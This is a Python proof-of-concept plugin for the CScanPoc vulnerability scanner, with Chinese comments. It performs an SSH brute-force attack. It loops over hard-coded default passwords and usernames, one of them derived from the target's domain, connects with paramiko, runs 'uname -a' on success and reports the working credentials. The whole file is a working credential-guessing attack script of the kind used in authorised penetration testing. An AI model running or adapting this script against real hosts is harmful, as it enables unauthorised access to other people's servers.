# coding: utf-8
import urllib.parse
import paramiko

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = "SSH_0101"  # 平台漏洞编号，留空
    name = "SSH Brute (暴力破解密码)"  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = "2015-01-29"  # 漏洞公布时间
    desc = """
    加载字典暴力破解SSH密码。
    """  # 漏洞描述
    ref = "Unknown"  # 漏洞来源
    cnvd_id = "Unknown"  # cnvd漏洞编号
    cve_id = "Unknown"  # cve编号
    product = "ssh"  # 漏洞应用名称
    product_version = "Unknown"  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = "bd0bf315-4958-4648-8463-2b46ce41d7c2"  # 平台 POC 编号，留空
    author = "hyhmnn"  # POC编写者
    create_date = "2018-05-29"  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info(
                "开始对 {target} 进行 {vuln} 的扫描".format(
                    target=self.target, vuln=self.vuln)
            )
            target = self.target_host
            domain_user = target.split(".")[-2]
            # Using Beebeeto-framework /utils password_list
            # password_list = open('%s/utils/payload/password_top100' % SETTINGS.FRAMEWORK_DIR)
            password_list = ["admin", "root", "admin123"]
            user_list = ["root", "test", "admin", domain_user]
            for pwd in password_list:
                for user in user_list:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(
                        paramiko.AutoAddPolicy())
                    try:
                        client.connect(
                            target, 22, username=user, password=pwd.strip(), timeout=8
                        )
                        stdin, stdout, stderr = client.exec_command("uname -a")
                        self.output.report(
                            self.vuln,
                            "发现{target}存在{name}漏洞;ssh_user={user},ssh_passwd={passwd},ssh_uname={ssh_uname} ".format(
                                target=self.target,
                                name=self.vuln.name,
                                user=user,
                                passwd=pwd.strip(),
                                ssh_uname=stdout.read(),
                            ),
                        )
                        client.close()
                        return
                    except Exception as e:
                        client.close()
                        if str(e) == "Authentication failed.":
                            self.output.info("Fail: %s\n\n" % e)
                            continue
                        else:
                            return
        except Exception as e:
            self.output.info("执行异常：{}".format(e))

    def exploit(self):
        self.verify()


if __name__ == "__main__":
    Poc().run()
